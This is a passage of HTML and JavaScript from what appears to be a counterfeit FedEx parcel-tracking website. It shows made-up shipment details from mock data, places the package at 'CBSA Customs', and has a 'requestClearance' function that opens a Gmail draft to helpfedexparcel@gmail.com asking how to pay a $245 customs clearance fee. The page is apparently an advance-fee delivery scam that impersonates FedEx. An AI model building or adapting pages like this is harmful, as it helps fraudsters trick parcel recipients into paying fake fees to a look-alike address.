                                    <span class="text-fedex-gray">Declared Value:</span>
                                    <span class="font-semibold text-fedex-orange">$${data.declared_value.toLocaleString()} USD</span>
                                </div>
                                <div class="flex justify-between">
                                    <span class="text-fedex-gray">Contents:</span>
                                    <span class="font-semibold">${data.contents}</span>
                                </div>
                                <div class="flex justify-between">
                                    <span class="text-fedex-gray">Reference:</span>
                                    <span class="font-semibold">${data.reference_number}</span>
                                </div>
                            </div>
                        </div>

                        <div class="bg-white border border-gray-200 rounded-lg p-3 sm:p-6 mb-4 sm:mb-6">
                            <h3 class="text-base sm:text-xl font-bold text-fedex-dark-gray mb-3 sm:mb-4">Shipping Information</h3>
                            <div class="space-y-3 sm:space-y-4 text-xs sm:text-base">
                                <div>
                                    <h4 class="font-semibold text-fedex-gray mb-1 sm:mb-2">From:</h4>
                                    <p class="text-fedex-dark-gray font-semibold">${data.sender_name}</p>
                                    <p class="text-fedex-gray">${data.sender_company}</p>
                                    <p class="text-fedex-gray">${data.sender_address}</p>
                                    <p class="text-fedex-gray">${data.sender_city}</p>
                                </div>
                                <div>
                                    <h4 class="font-semibold text-fedex-gray mb-1 sm:mb-2">To:</h4>
                                    <p class="text-fedex-dark-gray font-semibold">${data.recipient_name}</p>
                                    <p class="text-fedex-gray">${data.recipient_address}</p>
                                    <p class="text-fedex-gray">${data.recipient_city}</p>
                                    <p class="text-fedex-gray">Email: ${data.recipient_email}</p>
                                </div>
                            </div>
                        </div>

                        <div class="bg-white border border-gray-200 rounded-lg p-3 sm:p-6">
                            <h3 class="text-base sm:text-xl font-bold text-fedex-dark-gray mb-3 sm:mb-4">
                                <i class="fas fa-map-marker-alt mr-1 sm:mr-2 text-fedex-orange"></i>Package Journey
                            </h3>
                            <div class="map-container rounded-lg overflow-hidden">
                                <div class="relative w-full h-full">
                                    <div class="route-line"></div>
                                    <div class="route-marker origin"></div>
                                    <div class="route-marker current"></div>
                                    <div class="route-marker destination"></div>

                                    <div class="absolute top-2 sm:top-4 left-2 sm:left-4 bg-white px-2 py-1 rounded-full text-xs font-semibold text-fedex-purple shadow">
                                        <i class="fas fa-map-pin mr-1"></i> Hawthorne, TX
                                    </div>
                                    <div class="absolute top-2 sm:top-4 left-1/3 bg-white px-2 py-1 rounded-full text-xs font-semibold text-fedex-orange shadow">
                                        <i class="fas fa-map-marker mr-1"></i> Memphis, TN
                                    </div>
                                    <div class="absolute top-2 sm:top-4 right-2 sm:right-4 bg-white px-2 py-1 rounded-full text-xs font-semibold text-fedex-green shadow">
                                        <i class="fas fa-home mr-1"></i> Toronto, ON
                                    </div>

                                    <div class="absolute bottom-2 sm:bottom-4 left-1/2 transform -translate-x-1/2 bg-white px-2 sm:px-4 py-1 sm:py-2 rounded-lg shadow text-center">
                                        <div class="text-xs text-fedex-gray">Current Location</div>
                                        <div class="font-bold text-fedex-dark-gray text-xs sm:text-sm">CBSA Customs, ON</div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            `;
        }

        function getStepStatus(stepStatus, currentStatus) {
            const statusOrder = ['registered', 'in_transit', 'arrived', 'on_hold', 'out_for_delivery', 'delivered'];
            const stepIndex = statusOrder.indexOf(stepStatus);
            const currentIndex = statusOrder.indexOf(currentStatus);
            
            if (stepIndex < currentIndex) return 'completed';
            if (stepIndex === currentIndex) return 'current';
            return '';
        }

        function getStatusClass(status) {
            const statusClasses = {
                'registered': 'status-registered',
                'in_transit': 'status-in-transit',
                'arrived': 'status-in-transit',
                'on_hold': 'status-awaiting-clearance',
                'out_for_delivery': 'status-in-transit',
                'delivered': 'status-delivered'
            };
            return statusClasses[status] || 'status-registered';
        }

        function getStatusIcon(status) {
            const statusIcons = {
                'registered': 'check-circle',
                'in_transit': 'truck',
                'arrived': 'map-marker-alt',
                'on_hold': 'pause-circle',
                'out_for_delivery': 'shipping-fast',
                'delivered': 'check-circle'
            };
            return statusIcons[status] || 'info-circle';
        }

        function formatStatus(status) {
            return status.replace(/_/g, ' ').replace(/\b\w/g, l => l.toUpperCase());
        }

        function formatDate(dateString) {
            return new Date(dateString).toLocaleDateString('en-US', {
                year: 'numeric',
                month: 'long',
                day: 'numeric'
            });
        }

        function showNotification(message, type = 'info') {
            const notification = document.createElement('div');
            notification.className = `notification ${type}`;
            notification.innerHTML = `
                <div class="flex items-center">
                    <i class="fas fa-${getNotificationIcon(type)} mr-2"></i>
                    <span>${message}</span>
                </div>
            `;
            
            document.body.appendChild(notification);
            
            setTimeout(() => {
                notification.style.animation = 'slideInRight 0.3s ease-out reverse';
                setTimeout(() => notification.remove(), 300);
            }, 3000);
        }

        function getNotificationIcon(type) {
            const icons = {
                success: 'check-circle',
                error: 'exclamation-circle',
                warning: 'exclamation-triangle',
                info: 'info-circle'
            };
            return icons[type] || 'info-circle';
        }

        function requestClearance(trackingNumber) {
            const packageData = mockData.packages.find(pkg => 
                pkg.tracking_number.toUpperCase() === trackingNumber.toUpperCase()
            );

            if (!packageData) {
                showNotification('Package data not found', 'error');
                return;
            }

            const subject = `Clearance Payment for Package ${trackingNumber}`;
            const body = `Dear FedEx Team,

I am ready to pay the customs clearance fee for my package with tracking number: ${trackingNumber}

Package Details:
- Tracking Number: ${trackingNumber}
- Contents: ${packageData.contents}
- Declared Value: $${packageData.declared_value.toLocaleString()} USD
- Current Location: ${packageData.current_location}
- Required Payment: $${packageData.clearance_payment_required}

Recipient Information:
- Name: ${packageData.recipient_name}
- Address: ${packageData.recipient_address}, ${packageData.recipient_city}
- Email: ${packageData.recipient_email}

Please provide payment instructions for the $245 customs clearance fee.

Thank you,
${packageData.recipient_name}`;

            const gmailUrl = `https://mail.google.com/mail/?view=cm&fs=1&to=helpfedexparcel@gmail.com&su=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
            
            window.open(gmailUrl, '_blank');
            
            showNotification('Opening Gmail to send clearance payment request...', 'info');
        }

        function generatePDF(trackingNumber) {
            showNotification('PDF generation would be implemented here', 'info');
        }

        function requestEmailUpdates(trackingNumber) {
            showNotification(`Email updates enabled for ${trackingNumber}`, 'success');
        }

        // Page and Modal Functions
        function showPage(pageId) {
            document.querySelectorAll('.page-section').forEach(page => {
                page.classList.remove('active');
            });
            
            const targetPage = document.getElementById(pageId + '-page');
            if (targetPage) {
                targetPage.classList.add('active');
            }
            
            hideMobileMenu();
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }

        function showModal(modalId) {
            const modal = document.getElementById(modalId);
            if (modal) {
                modal.classList.remove('hidden');
                modal.classList.add('flex');
            }
            hideMobileMenu();
        }

        function closeModal(modalId) {
            const modal = document.getElementById(modalId);
            if (modal) {
                modal.classList.add('hidden');
                modal.classList.remove('flex');
            }
        }

        function toggleMobileMenu() {
            const mobileMenu = document.getElementById('mobile-menu');
            mobileMenu.classList.toggle('show');
        }

        function hideMobileMenu() {
            const mobileMenu = document.getElementById('mobile-menu');
            mobileMenu.classList.remove('show');
        }

        // Event Listeners Setup
        document.addEventListener('DOMContentLoaded', function() {
            // Tracking form
            const trackingForm = document.getElementById('tracking-form');
            trackingForm.addEventListener('submit', async function(e) {
                e.preventDefault();
                const trackingNumber = document.getElementById('tracking-number').value.trim();
                const trackButton = document.getElementById('track-button');
                const trackText = document.getElementById('track-text');
                const trackLoading = document.getElementById('track-loading');
                
                if (!trackingNumber) {
                    showNotification('Please enter a tracking number', 'error');
                    return;
                }
                
                trackText.classList.add('hidden');
                trackLoading.classList.remove('hidden');
                trackButton.disabled = true;
                
                const found = await trackPackage(trackingNumber);
                
                if (found) {
                    showModal('tracking-modal');
                } else {
                    showNotification('Tracking number not found. Please check and try again.', 'error');
                }
                
                trackText.classList.remove('hidden');
                trackLoading.classList.add('hidden');
                trackButton.disabled = false;
            });

            // Modal close button
            document.getElementById('close-modal').addEventListener('click', () => closeModal('tracking-modal'));

            // Keyboard shortcuts
            document.addEventListener('keydown', function(e) {
                if (e.key === 'Escape') {
                    closeModal('tracking-modal');
                }
            });
        });
    </script>
</body>
</html>